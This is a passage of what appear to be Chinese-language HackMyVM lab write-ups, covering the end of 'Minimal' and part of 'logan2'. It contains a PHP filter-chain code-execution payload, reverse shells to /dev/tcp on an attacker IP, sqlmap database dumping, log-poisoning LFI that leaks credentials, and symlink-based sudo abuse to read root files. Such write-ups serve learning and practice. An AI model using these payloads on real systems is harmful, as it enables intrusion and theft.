P1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=bash%20/tmp/a.sh


┌──(kali㉿kali)-[~/test]
└─$ cat shell.sh
bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1                                   
```

成功弹回

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.135] 44534
bash: cannot set terminal process group (750): Inappropriate ioctl for device
bash: no job control in this shell
www-data@minimal:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
www-data@minimal:/var/www/html$ sudo -l
Matching Defaults entries for www-data on minimal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on minimal:
    (root) NOPASSWD: /opt/quiz/shop
www-data@minimal:/var/www/html$ ls -la /opt/quiz/shop
-rwxrwxr-x 1 root root 16632 Nov  5  2023 /opt/quiz/shop

```

能`读取、执行`，不能修改(×﹏×)。我们把文件拖去本地用**IDA**看看

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdi
  _DWORD v5[4]; // [rsp+10h] [rbp-20h] BYREF
  char *v6; // [rsp+20h] [rbp-10h]
  char *s; // [rsp+28h] [rbp-8h]

  strcpy((char *)v5, 'results.txt');
  s = 'Hey guys, I have prepared this little program to find out how much you know about me, since I have been your admin'
      'istrator for 2 years.';
  v6 = 'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash';
  puts(
    'Hey guys, I have prepared this little program to find out how much you know about me, since I have been your adminis'
    'trator for 2 years.');
  puts(
    'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash');
  v5[3] = question_1(
            'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you d'
            'on't, you win trash');
  v5[3] += question_2(
             'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you '
             'don't, you win trash');
  v5[3] += question_3(
             'If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you '
             'don't, you win trash');
  v3 = (__int64)v5;
  writeResults(v5, v5[3]);
  if ( v5[3] == 3 )
  {
    v3 = 3LL;
    print_prize(3LL);
  }
  if ( foo == 85 )
    wait_what(v3);
  return 0;
}
```

主要是实现了，让你回答3个问题，如果回答正确了，可以获得一个泰迪熊。我们尝试获取一下问题的答案

![image](https://github.com/user-attachments/assets/e6f1496e-80f6-4b48-97ed-976913a92103)

question_1的答案是`linux`

![image](https://github.com/user-attachments/assets/e17ea303-2bfe-45bc-aec3-3e29dffd0867)

question_2的答案是`gfhts ufshfpjx`

![image](https://github.com/user-attachments/assets/5f0b1612-dbd7-48cb-9bcc-dd7e41076d35)

question_3的答案是`hpok&amp;qorn&amp;vjsaohu`

![image](https://github.com/user-attachments/assets/3bdb6f71-68f0-4c42-8288-f7ec5337f1b4)

第2和第3个是错的，可能是通过了加密，但是我没有系统的学过加密算法和逆向，所以只可以慢慢试了

先有收获的是第3个，是使用了**XOR**，我通过[cyberchef](https://cyberchef.org/)暴力破解获得了几个像密码的字符串

![image](https://github.com/user-attachments/assets/47f3df6a-6afd-47c9-8e17-d1001ec2e98b)

我通过提权获得的字典表

```bash
www-data@minimal:/tmp$ awk -F ': ' '{print $2}' tmp2 
iqnj'pnso'wkr`nit
jrmi$smpl$thqcmjw
kslh%rlqm%uipblkv
ltko'ukvj'rnweklq
mujn#tjwk#sovdjmp
nvim with plugins
owhl!vhui!qmtfhor
`xgc.ygzf.~b{ig`}
ayfb/xf{g/czhfa|
bzea,{exd,|`ykeb
c{d`-zdye-}axjdc~
d|cg*}c~b*zfmcdy
e}bf+|bc+{g~lbex
f~ae(a|`(xd}oaf{
g`d)~`}a)ye|n`gz
x`{6ab~6fzcqxe
ya~z7`~c7g{bp~yd
zb}y4c}`|4dxas}zg
{c|x5b|a}5ey`r|{f
|d{2e{fz2b~gu{|a
}ez~3dzg{3cftz}`
~fy}0gydx0`|ewy~c
gx|1fxey1a}dvxb
phws&gt;iwjv&gt;nrkywpm
qivr?hvkw?osjxvql
rjuq&lt;kuht&lt;lpi{uro
sktp=jtiu=mqhztsn
tlsw:msnr:jvo}sti
umrv;lros;kwn|ruh
vnqu8oqlp8htmqvk
wopt9npmq9iul~pwj
```

写了个小脚本跑一下（AI辅助）

```bash
#!/bin/bash

password_file='/tmp/tmp2'

while IFS= read -r password; do
  echo 'Trying password: $password'
  
  echo -e '$password\n' | sudo /opt/quiz/shop &gt; /tmp/output.txt
  
  if grep -q 'Correct!!' /tmp/output.txt; then
    echo 'Password found: $password'
    break
  fi
done &lt; '$password_file'
```

执行

```bash
www-data@minimal:/tmp$ bash b.sh 
Trying password: iqnj'pnso'wkr`nit
Trying password: jrmi$smpl$thqcmjw
Trying password: kslh%rlqm%uipblkv
Trying password: ltko'ukvj'rnweklq
Trying password: mujn#tjwk#sovdjmp
Trying password: nvim with plugins
Password found: nvim with plugins

```

第三个答案是：`nvim with plugins`

第二个的答案，细细品了一下，发现了一个'秘密'(第三个也可以通过这种方式获得加密的方法)
![image](https://github.com/user-attachments/assets/3903a8b9-2360-4ed3-b421-052babc11356)

凯撒！！！

![image](https://github.com/user-attachments/assets/b6e01404-1abc-485d-b4be-18726c675c3d)

所以第二题的答案是：`bacon pancakes`

```bash
www-data@minimal:/opt/quiz$ sudo /opt/quiz/shop
Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
What is my favorite OS?
linux
Correct!!
What is my favorite food?
bacon pancakes
Correct!!
What is my favorite text editor?
nvim with plugins
Correct!!
User name: 
Saving results .
HURRAY YOU HAVE FOUND ME
 _________________________________________________________
|\=========================================================\
||                                                         |
||        _        __        ___        __        _        |
||       ; `-.__.-'. `-.__.-'. .`-.__.-' .`-.__.-' :       |
||     _.'. . . . . . . . .,,,,,,,. . . . . . . . .`._     |
||   .'. . . . . . . . ,a@@@@@@@@@@@a, . . . . . . . .`.   |
||   `. . . . ,a@@@@@a@@@a@@@@@@@@@a@@@a@@@@@a, . . . ,'   |
||     ) . . a@@@@@@a@@@@@a@@@@@@@a@@@@@a@@@@@@a . . (     |
||   ,' . . .@@@%%%a@@@@@@@@@@@@@@@@@@@@@a%%%@@@  . . `.   |
||   `.. . . @@@%%a@@@@@@''@@@@@@@''@@@@@@a%%@@@ . . .,'   |
||     ). . . '@@a@@@@@@@@@SSSSSSS@@@@@@@@@a@@' . . .(     |
||   ,'. . . . . `@@@@@@@@SSS, ,SSS@@@@@@@@' . . . . .`.   |
||   `. . . . . . `@@@@@@@`SSS:SSS'@@@@@@@' . . . . . ,'   |
||     ) . . . . . `@@@@@@@sssssss@@@@@@@' . . . . . (     |
||   ,' . . . . . ,a@@a@@@@@@@@@@@@@@@a@@a, . . . . . `.   |
||   `.. . . . .a@@@a@@@@@a@@@a@@@a@@@@@a@@@a. . . . .,'   |
||     ). . . .a@@@@@a@@@@@@@@@@@@@@@@@a@@@@@a. . . .(     |
||   ,'. . . . @@@@@@a@@@@'   '   `@@@@a@@@@@@ . . . .`.   |
||   `. . . . .@@@@@@@aaaa,       ,aaaa@@@@@@@  . . . ,'   |
||     ) . . . `@@@@@@@@@@@@a, ,a@@@@@@@@@@@@' . . . (     |
||   ,' . . . . .`@@@@@@@@@@a@a@a@@@@@@@@@@'. . . . . `.   |
||   `;;;;;;;;;;;;aaaaaaaaaa@@@@@aaaaaaaaaa;;;;;;;;;;;;'   |
||     );;;;;;;,mMMMMMMMm@@@@@@@@@@@mMMMMMMMm,;;;;;;;(     |
||   ,;;;;;;;;a@%#%%#%%#%Mm@@@@@@@mM%#%%#%%#%@a;;;;;;;;,   |
||   `;;;;;;;;@@%%%%%%%%%%M@@';'@@M%%%%%%%%%%@@;;;;;;;;'   |
||     );;;;;;`@a%%%%%%%%mM';;;;;'Mm%%%%%%%%a@';;;;;;(     |
||   ,;;;;;;;;;;'@@@@@@@@';;;;;;;;;'@@@@@@@@';;;;;;;;;;,   |
||   `;;;;;;;;;;;;'''''';;;;;;;;;;;;;'''''';;;;;;;;;;;;'   |
||     );;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-Catalyst(     |
||     `:;;;:-~~~-:;;:-~~~-:;;;;;:-~~~-:;;:,-~~~-:;;;:'    |
||       ~~~       ~~        ~~~        ~~        ~~~      |
||                     .=============.                     |
||                     |   Mr. Bear  :                     |
||                     `-------------'                     |
\|_________________________________________________________|


And now what??
```

来之不易的泰迪熊，然后再看下**IDA**这个泰迪熊怎么来的

![image](https://github.com/user-attachments/assets/979a41d4-5417-4482-a112-f0321c3c3c3c)

![image](https://github.com/user-attachments/assets/11520f4a-cb3a-4bd6-b69d-ddc0c742cdaa)

是查看了`prize.txt`文件，那就简单了，创建一个**软链接**就好了

```bash
www-data@minimal:/opt/quiz$ ln -s prize.txt /root/root.txt
ln: failed to create symbolic link '/root/root.txt': Permission denied
```

蛙趣，没权限，等我回想了一下，好像要去家目录，之前看群主`ll04567`都可以实现，再试试

```bash
www-data@minimal:/var/www/html$ ln -s /root/root.txt prize.txt 
www-data@minimal:/var/www/html$ ls -al
total 64
drwxr-xr-x 4 www-data www-data 4096 Jan 14 08:56 .
drwxr-xr-x 3 root     root     4096 Nov  1  2023 ..
-rw-rw-r-- 1 www-data www-data 2964 Nov  1  2023 admin.php
-rw-rw-r-- 1 www-data www-data  892 Nov  1  2023 buy.php
-rw-r--r-- 1 www-data www-data  355 Nov  1  2023 config.php
drwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 imgs
-rw-r--r-- 1 www-data www-data 2601 Nov  1  2023 index.php
-rw-r--r-- 1 www-data www-data 1836 Nov  1  2023 login.php
-rw-r--r-- 1 www-data www-data  321 Nov  1  2023 logout.php
lrwxrwxrwx 1 www-data www-data   14 Jan 14 08:56 prize.txt -&gt; /root/root.txt
-rw-r--r-- 1 www-data www-data 2221 Nov  1  2023 register.php
-rw-rw-r-- 1 www-data www-data 3621 Nov  1  2023 reset_pass.php
-rw-r--r-- 1 www-data www-data  111 Nov  1  2023 restricted.php
-rw-r--r-- 1 root     root       18 Jan 14 07:58 results.txt
-rw-r--r-- 1 www-data www-data   12 Nov  1  2023 robots.txt
-rw-rw-r-- 1 www-data www-data 2549 Nov  1  2023 shop_cart.php
drwxr-xr-x 2 www-data www-data 4096 Nov  1  2023 styles
www-data@minimal:/var/www/html$ sudo /opt/quiz/shop
Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
What is my favorite OS?
linux
Correct!!
What is my favorite food?
bacon pancakes
Correct!!
What is my favorite text editor?
nvim with plugins
Correct!!
User name: 
Saving results .
HMV{xxxxxxxxxxxxx} 

```

行了，下班

![006mowZngy1gd6j0zxr0tg30as0bctww](assets/006mowZngy1gd6j0zxr0tg30as0bctww-20250114171159-n4ev1fr.gif)

# 5.后话

去看了其他大佬的[wp](http://162.14.82.114/index.php/574/04/16/2024/)，发现还可以使用**构造 ROP 链**的方式提权，感兴趣的可以去看`HGBE`大佬的[wp](http://162.14.82.114/index.php/574/04/16/2024/)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Minimal.html</guid><pubDate>Fri, 27 Jun 2025 09:33:23 +0000</pubDate></item><item><title>hmv_logan2</title><link>https://7r1UMPHK.github.io/post/hmv_logan2.html</link><description># hmv_logan2

# 0.简介

**靶机**：[hackmyvm - logan2](https://hackmyvm.eu/machines/machine.php?vm=logan2)
**难度**：黄色
**目标 IP**：192.168.205.144
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.144
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:59 CST
Nmap scan report for 192.168.205.144
Host is up (0.00045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
3000/tcp open  http    Golang net/http server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=1/20%Time=678E107B%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request')%r(GetRequest,1000,'HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=abfb225a6c69b259;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=1KgRX_Fci-rGge6j5LIyElk
SF:Aqp46MTczNzM2MzU3ODgyMTcyMjg4Mg;\x20Path=/;\x20Expires=Tue,\x2021\x20Ja
SF:n\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
SF:IGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x20GMT\r\n\r\n&lt;!
SF:DOCTYPE\x20html&gt;\n&lt;html\x20lang=\'en-US\'\x20class=\'theme-\'&gt;\n&lt;head\x
SF:20data-suburl=\'\'&gt;\n\t&lt;meta\x20charset=\'utf-8\'&gt;\n\t&lt;meta\x20name=\'v
SF:iewport\'\x20content=\'width=device-width,\x20initial-scale=1\'&gt;\n\t&lt;me
SF:ta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edge\'&gt;\n\t&lt;title&gt;
SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link
SF:\x20rel=\'manifest\'\x20href=\'/manifest\.json\'\x20crossorigin=\'use-c
SF:redentials\'&gt;\n\t&lt;meta\x20name=\'theme-color\'\x20content=\'#6cc644\'&gt;\
SF:n\t&lt;meta\x20name=\'author\'\x20content=\'Gitea\x20-\x20Git\x20with\x20a
SF:\x20cup\x20of\x20tea\'\x20/&gt;\n\t&lt;meta\x20name=\'description\'\x20conten
SF:t=\'Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
SF:nless')%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request')%r(HTTPOptions,1000,'HTTP/1\.0\x20404\x20Not\x20Found\r\
SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=aa
SF:35213287ba9b56;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=ibf5qw0V
SF:W54yX8vVkKfbkR8gck06MTczNzM2MzU3ODgzNzkzMjYzOA;\x20Path=/;\x20Expires=T
SF:ue,\x2021\x20Jan\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x
SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\'en-US\'\x20class=\'the
SF:me-\'&gt;\n&lt;head\x20data-suburl=\'\'&gt;\n\t&lt;meta\x20charset=\'utf-8\'&gt;\n\t&lt;m
SF:eta\x20name=\'viewport\'\x20content=\'width=device-width,\x20initial-sc
SF:ale=1\'&gt;\n\t&lt;meta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edg
SF:e\'&gt;\n\t&lt;title&gt;Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
SF:20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link\x20rel=\'manifest\'\x20hre
SF:f=\'/manifest\.json\'\x20crossorigin=\'use-credentials\'&gt;\n\t&lt;meta\x20n
SF:ame=\'theme-color\'\x20content=\'#6cc644\'&gt;\n\t&lt;meta\x20name=\'author\'
SF:\x20content=\'Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\'\x20/
SF:&gt;\n\t&lt;meta\x20name=\'description\'\x20content=\'Gitea\x20\(Git\x20with\
SF:x20a\x20c');
MAC Address: 08:00:27:B1:96:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds

```

80、3000都是http服务

# 2.踩点

80是欢迎页，有一个脚本。3000是Gitea通常没洞，所以我们先看脚本

```bash
http://192.168.205.144/script.js

document.addEventListener('DOMContentLoaded', function() {
    fetch('/save-user-agent.php', {
        method: 'POST',
        body: JSON.stringify({ user_agent: navigator.userAgent }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response =&gt; {
        if (response.ok) {
            console.log('User-Agent saved successfully.');
        } else {
            console.error('Error saving User-Agent.');
        }
    })
    .catch(error =&gt; {
        console.error('Network error:', error);
    });
});

```

意思是它user_agent可以以json传点东西，开个burp试试

![Image](https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564)

sql注一下看有没有东西

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ sqlmap -r sql.txt --batch
        ___
       __H__                                                                                                                         
 ___ ___[,]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [,]     | .'| . |                                                                                                            
|___|_  [']_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:10:23 /2025-01-20/

[17:10:23] [INFO] parsing HTTP request from 'sql.txt'
JSON-like data found in GET body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_csrf' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[17:10:23] [INFO] testing connection to the target URL
[17:10:23] [INFO] testing if the target URL content is stable
[17:10:23] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[17:10:23] [INFO] testing if (custom) POST parameter 'JSON-like user_agent' is dynamic
[17:10:23] [WARNING] (custom) POST parameter 'JSON-like user_agent' does not appear to be dynamic
[17:10:23] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON-like user_agent' might not be injectable
[17:10:23] [INFO] testing for SQL injection on (custom) POST parameter 'JSON-like user_agent'
[17:10:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:10:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:10:24] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:10:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:10:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:10:24] [INFO] testing 'Generic inline queries'
[17:10:24] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:10:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:10:24] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'
[17:10:24] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'
[17:10:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:10:24] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[17:10:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:10:24] [WARNING] (custom) POST parameter 'JSON-like user_agent' does not seem to be injectable
[17:10:24] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 17:10:24 /2025-01-20/


```

不行，自己写一个试试

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{'user_agent':'1'}' --batch --current-db 
        ___
       __H__                                                                                                                         
 ___ ___[']_____ ___ ___  {1.9#stable}                                                                                               
|_ -| . [)]     | .'| . |                                                                                                            
|___|_  [(]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

省略
[17:17:19] [INFO] adjusting time delay to 1 second due to good response times
logan
current database: 'logan'

┌──(kali㉿kali)-[~/test/tmp]
└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{'user_agent':'1'}' --batch -D logan --tables     
        ___
       __H__                                                                                                                         
 ___ ___[(]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [(]     | .'| . |                                                                                                            
|___|_  [']_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

省略
[17:26:42] [INFO] adjusting time delay to 1 second due to good response times
3
[17:26:42] [INFO] retrieved: browser
[17:27:04] [INFO] retrieved: comments
[17:27:30] [INFO] retrieved: users
Database: logan
[3 tables]
+----------+
| browser  |
| comments |
| users    |
+----------+


┌──(kali㉿kali)-[~/test/tmp]
└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{'user_agent':'1'}' --batch -D logan -T users --dump
        ___
       __H__                                                                                                                         
 ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [)]     | .'| . |                                                                                                            
|___|_  [(]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

省略
Database: logan
Table: users
[1 entry]
+------------------------------+--------+
| email                        | user   |
+------------------------------+--------+
| logan@newsitelogan.logan.hmv | logan  |
+------------------------------+--------+

```

只有一个用户名和域名，我们将域名加上

![Image](https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2)

试试有没有文件包含

![Image](https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea)

存在文件包含，尝试读取密钥，无果。看看存不存在日志注入

![Image](https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee)

存在，尝试注入

![Image](https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b)

嘻嘻

![Image](https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c)

不嘻嘻，容易的都给它禁了

![Image](https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7)

还一分钟清一次，考验手速是吧？

![Image](https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a)

![Image](https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd)

```bash
┌──(kali㉿kali)-[~/test]
└─$ echo 'PD9waHAKCQoJJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKCSR1c2VybmFtZSA9ICJsb2dhbiI7CgkkcGFzc3dvcmQgPSAiU3VwZXJfbG9nYW4xMjM0IjsKCSRkYm5hbWUgPSAibG9nYW4iOwoKCS8vIENyZWF0ZSBjb25uZWN0aW9uCgkkY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKCS8vIENoZWNrIGNvbm5lY3Rpb24KCWlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewoJICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwoJfQoKPz4K' |base64 -d
&lt;?php

        $servername = 'localhost';
        $username = 'logan';
        $password = 'Super_logan1234';
        $dbname = 'logan';

        // Create connection
        $conn = new mysqli($servername, $username, $password, $dbname);
        // Check connection
        if ($conn-&gt;connect_error) {
          die('Connection failed: ' . $conn-&gt;connect_error);
        }

?&gt;

```

登录Gitea

![Image](https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c)

改个shell上去

```bash
#!/bin/sh
bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'
省略
```

交个文件上去

![Image](https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a)

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 55202
bash: cannot set terminal process group (428): Inappropriate ioctl for device
bash: no job control in this shell
git@logan2:~/gitea-repositories/logan/future_web.git$ id
id
uid=104(git) gid=113(git) groups=113(git)
```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```bash
git@logan2:~/gitea-repositories/logan/future_web.git$ sudo -l
Matching Defaults entries for git on logan2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User git may run the following commands on logan2:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
git@logan2:~/gitea-repositories/logan/future_web.git$ ls -la /opt/app.py
ls: cannot access '/opt/app.py': Permission denied
git@logan2:~/gitea-repositories/logan/future_web.git$ cd /home/
git@logan2:/home$ ls -al
total 20
drwxr-xr-x  5 root  root  4096 Sep 11  2023 .
drwxr-xr-x 18 root  root  4096 Aug 27  2023 ..
